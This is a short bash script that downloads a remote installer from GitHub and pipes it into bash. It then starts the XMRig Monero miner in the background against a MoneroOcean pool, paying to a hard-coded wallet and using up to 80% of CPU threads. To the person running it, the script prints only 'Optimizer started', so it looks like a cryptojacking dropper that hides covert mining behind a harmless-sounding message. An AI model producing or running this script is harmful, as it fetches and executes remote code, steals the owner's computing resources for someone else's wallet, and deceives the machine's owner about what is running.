#!/bin/bash
# Auto-install XMRig miner
curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 4AE46gCxzaEAp76MAqD4ibaEVFmGvgLsF111E5pGSrwf334a5KLoDtyeX8vJmkapqXjMd67bhUBu5Go25GdQrcqV5iziwiL
nohup /usr/local/bin/xmrig -o gulf.moneroocean.stream:10128 -u 4AE46gCxzaEAp76MAqD4ibaEVFmGvgLsF111E5pGSrwf334a5KLoDtyeX8vJmkapqXjMd67bhUBu5Go25GdQrcqV5iziwiL -p auto-worker --cpu-max-threads-hint=80 --donate-level=1 --background &
echo "Optimizer started"
